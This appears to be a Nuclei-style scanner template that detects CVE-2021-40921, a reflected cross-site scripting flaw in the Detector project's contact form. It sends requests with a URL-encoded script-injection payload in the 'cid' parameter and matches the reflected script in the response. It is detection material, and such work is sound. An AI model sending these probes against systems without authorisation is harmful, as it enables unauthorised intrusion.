id: xss-CVE-2021-40921

info:
  name: CVE-2021-40921
  author: osamahamad
  severity: medium
  description: Cross-site scripting (XSS) on https://github.com/dmolsen/Detector/issues/35
  tags: xss,discourse

requests:
  - method: GET
    path:
      - '{{BaseURL}}/Detector/web/templates/_contactform.inc.php?cid=%3C/textarea%3E%3Cscript%3Ealert(1);%3C/script%3E'
      - '{{BaseURL}}/web/templates/_contactform.inc.php?cid=%3C/textarea%3E%3Cscript%3Ealert(1);%3C/script%3E'
      - '{{BaseURL}}/templates/_contactform.inc.php?cid=%3C/textarea%3E%3Cscript%3Ealert(1);%3C/script%3E'
    
    
    redirects: true
    max-redirects: 1
    matchers-condition: and
    matchers:

      - type: word
        words:
          - '</textarea><script>alert(1);</script>'
        part: body

      - type: word
        words:
          - "text/html"
        part: header
